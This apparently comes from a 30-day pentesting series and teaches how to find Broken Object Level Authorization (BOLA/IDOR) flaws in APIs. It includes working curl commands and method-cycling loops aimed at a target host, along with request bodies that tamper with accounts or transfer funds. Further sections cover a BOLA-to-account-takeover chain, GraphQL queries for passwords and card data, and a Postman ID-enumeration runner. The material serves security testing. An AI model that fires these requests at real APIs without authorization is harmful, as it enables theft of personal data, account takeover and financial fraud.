# BOLA/IDOR in APIs: The #1 API Vulnerability Explained

> **Series:** 30-Day API Pentesting  
> **Day:** 8 — Week 2: OWASP API Top 10  
> **Topic:** OWASP API1: Broken Object Level Authorization (BOLA)

---

## What is BOLA?

Broken Object Level Authorization (BOLA) — formerly known as IDOR (Insecure Direct Object Reference) in web security — occurs when an API endpoint accepts a user-supplied object ID and returns data without verifying that the requesting user owns or has permission to access that object.

**Why it's #1:** It's trivial to find, trivially easy to exploit, and almost impossible to detect with automated scanners. Every ID in every request is a potential BOLA.

---

## 01 · BOLA Attack Setup

```
You need exactly 2 test accounts:

Account A (Attacker):
  email:   attacker@test.com
  user_id: 1002
  token:   TOKEN_A  (Bearer eyJhbGci...)

Account B (Victim):
  email:   victim@test.com
  user_id: 1001
  token:   TOKEN_B  (Bearer eyJhbGci...)

The test:
  Use TOKEN_A to access resources owned by user_id 1001
  If server returns data → BOLA confirmed
```

---

## 02 · Where BOLA Hides

```bash
# 1. Path parameters (most common)
GET /api/v1/users/1001/profile        # user_id in path
GET /api/v1/orders/5532               # order_id in path
GET /api/v1/invoices/9871             # invoice_id in path
GET /api/v1/documents/abc-123         # doc_id in path

# 2. Query parameters
GET /api/export?user_id=1001
GET /api/reports?account_id=1001&type=financial
GET /api/download?file_id=55&user=1001

# 3. Request body
POST /api/transfer
{"from_account": 1001, "to_account": 9999, "amount": 500}

PUT /api/profile/update
{"user_id": 1001, "email": "attacker@attacker.com"}

# 4. Headers
X-User-ID: 1001
X-Account: 1001
X-Resource-Owner: 1001

# 5. Indirect object references
GET /api/my-invoice        # returns {invoice_id: "INV-9871"}
GET /api/invoices/INV-9871 # now test with another account's invoice_id
```

---

## 03 · Step-by-Step Testing

```bash
# Step 1 — Map all endpoints with IDs
# Browse the app, note every ID that appears in URLs and responses
# Example IDs found:
#   user_id: 1002
#   order_id: 88234
#   invoice_id: INV-4421
#   document_id: 550e8400-e29b-41d4-a716-446655440000

# Step 2 — Create Account B (victim), note its IDs
#   user_id: 1001
#   order_id: 88235
#   invoice_id: INV-4422

# Step 3 — Test with Account A's token, Account B's IDs
curl -H "Authorization: Bearer TOKEN_A" \
     https://api.target.com/api/v1/invoices/INV-4422

# Expected: 403 Forbidden
# BOLA if: 200 OK with INV-4422 data (owned by Account B)

# Step 4 — Test all HTTP methods
for method in GET PUT PATCH DELETE; do
  echo -n "$method /api/users/1001: "
  curl -s -o /dev/null -w "%{http_code}" \
    -X $method \
    -H "Authorization: Bearer TOKEN_A" \
    -H "Content-Type: application/json" \
    -d '{"email":"pwned@attacker.com"}' \
    https://api.target.com/api/users/1001
  echo
done
```

---

## 04 · GUID / UUID BOLA

```bash
# UUIDs don't prevent BOLA — you just need to find them

# Where to find victim UUIDs:
# 1. In API responses (other users' resources leaked)
# 2. Error messages: "Document abc-123 not found for user xyz-456"
# 3. Email links: "View your invoice: /invoices/550e8400-..."
# 4. Wayback Machine, Google cache
# 5. JavaScript files

# UUIDv1 is time-based — can be predicted/enumerated
# UUIDv4 is random — need to find from above sources

# Test UUID BOLA
curl -H "Authorization: Bearer TOKEN_A" \
  https://api.target.com/api/v1/documents/550e8400-e29b-41d4-a716-446655440000

# Enumerate UUIDs from JS files
curl -s https://target.com/app.js | grep -oE '[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}'
```

---

## 05 · Chained BOLA for Higher Impact

```bash
# Chain 1: BOLA → PII exposure (High/Critical)
GET /api/users/1001 → returns {email, phone, address, ssn, dob}
# Impact: PII of all users exposed

# Chain 2: BOLA → Account Takeover
# Step 1: BOLA to read victim's email
GET /api/users/1001 → {email: "victim@victim.com"}
# Step 2: Trigger password reset
POST /api/forgot-password {"email": "victim@victim.com"}
# Step 3: BOLA on reset token endpoint
GET /api/reset-tokens/1001 → {token: "abc123"}
# Step 4: Reset password = ATO

# Chain 3: Write BOLA → Account modification
PUT /api/users/1001
Authorization: Bearer TOKEN_A
{"email": "attacker@attacker.com", "phone": "1234567890"}
# If 200 = attacker modified victim's account data

# Chain 4: Delete BOLA
DELETE /api/users/1001
Authorization: Bearer TOKEN_A
# If 200/204 = attacker deleted victim's account → Critical

# Chain 5: BOLA → Financial fraud
POST /api/payments
{"from_account": "1001", "to_account": "attacker_account", "amount": 9999}
Authorization: Bearer TOKEN_A
# Transfer from victim's account without their consent
```

---

## 06 · BOLA in GraphQL

```graphql
# Test in GraphQL — change ID in query arguments
{
  user(id: 1001) {
    email
    password
    apiKey
    paymentMethods {
      cardNumber
      cvv
    }
  }
}

# Mutation BOLA
mutation {
  deleteUser(id: 1001) {
    success
  }
}

mutation {
  updateEmail(userId: 1001, email: "attacker@attacker.com") {
    success
  }
}

# Using Account A's token to run all queries on user 1001
# If returns data = GraphQL BOLA
```

---

## Postman Automation

```javascript
// Tests tab — auto-detect BOLA
pm.test("BOLA Check", function() {
    var data = pm.response.json();
    
    // Check if response contains victim's data
    if (pm.response.code === 200) {
        // If userId in response doesn't match YOUR userId
        if (data.userId && data.userId !== pm.environment.get("my_user_id")) {
            console.log("BOLA FOUND!");
            console.log("Accessed resource owned by: " + data.userId);
            console.log(JSON.stringify(data));
        }
    }
});

// Collection Runner with IDs CSV:
// id
// 1001
// 1002
// 1003
// ... run 1000 IDs automatically
```

---

## Checklist

```
☐  Create 2 test accounts — Account A (attacker) + Account B (victim)
☐  Note ALL IDs — user_id, order_id, invoice_id from every response
☐  Test path params — GET /api/resource/{victim_id} with attacker token
☐  Test body + query params — swap to victim's IDs in POST bodies
☐  Try GUIDs too — find victim UUIDs via responses, emails, JS files
☐  Test write + delete BOLA — PUT/DELETE on victim's resources
☐  Test all HTTP methods — GET+PUT+DELETE on same vulnerable endpoint
☐  Chain to ATO — BOLA + password reset = account takeover
```

---

*30-Day API Pentesting Series — follow for more.*
